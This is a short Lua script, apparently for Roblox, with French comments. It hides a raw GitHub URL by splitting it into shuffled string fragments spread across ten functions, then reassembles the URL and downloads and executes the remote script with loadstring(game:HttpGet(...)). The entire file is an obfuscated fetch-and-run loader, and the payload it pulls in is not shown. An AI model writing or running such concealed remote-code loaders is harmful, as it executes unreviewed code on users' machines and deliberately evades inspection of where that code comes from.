-- Définition des morceaux avec des noms "désordonnés"
local function part3() return "w.gi".."th".."ub" end
local function part8() return "main/" .. "64L" end
local function part1() return "h".."tt".."ps" end
local function part6() return "timax" .. "/Scr" end
local function part2() return ":/".."/r".."a" end
local function part5() return ".c".. "om/".."sol" end
local function part7() return "iptpub" .. "lic/" end
local function part4() return "user".."con".."tent" end
local function part9() return "PVD".."KO" end
local function part10() return ".lua" end

-- Mélange des assignations
local a, b, c = part3(), part6(), part8()
local d, e = part1(), part9()
local f, g = part2(), part5()
local h, i, j = part7(), part4(), part10()

-- Concaténation finale dans le bon ordre
local url = d..f..a..i..g..b..h..c..e..j

-- Charge et exécute le script
local success, err = pcall(function()
    loadstring(game:HttpGet(url, true))()
end)

if not success then
    warn("Erreur en chargeant le script :", err)
end
